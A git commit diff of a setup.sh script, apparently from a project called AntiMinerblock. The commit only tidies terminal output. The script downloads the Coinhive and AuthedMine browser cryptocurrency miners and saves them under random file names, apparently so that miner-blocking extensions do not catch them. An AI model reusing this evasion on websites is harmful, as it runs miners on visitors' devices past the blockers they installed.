c4f6732c03d1d0494d16515f135e58876fe5d41f
SkyrisBactera <davis.davalos.delosh@gmail.com>
2017-11-20 15:57:39 -0700

    Removing clutter in terminal

--- setup.sh
+++ setup.sh
@@ -1,12 +1,12 @@
-echo Generating random file names
+echo Generating random file names...
 coinhive=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)".js"
 authminer=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)".js"
 minerblock=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)".js"
-echo Downloading scripts
-wget -O $coinhive http://coinhive.com/lib/coinhive.min.js
-wget -O $authminer https://authedmine.com/lib/authedmine.min.js
-wget -O $minerblock https://cdn.rawgit.com/SkyrisBactera/AntiMinerblock/master/minerblock.js
-echo Substituting the filenames into $minerblock
+echo Downloading scripts...
+wget -O $coinhive http://coinhive.com/lib/coinhive.min.js >/dev/null
+wget -O $authminer https://authedmine.com/lib/authedmine.min.js >/dev/null
+wget -O $minerblock https://cdn.rawgit.com/SkyrisBactera/AntiMinerblock/master/minerblock.js >/dev/null
+echo Substituting the filenames into $minerblock...
 sed -i 's/coinSUB/'$coinhive'/g' $minerblock
 sed -i 's/authSUB/'$authminer'/g' $minerblock
 
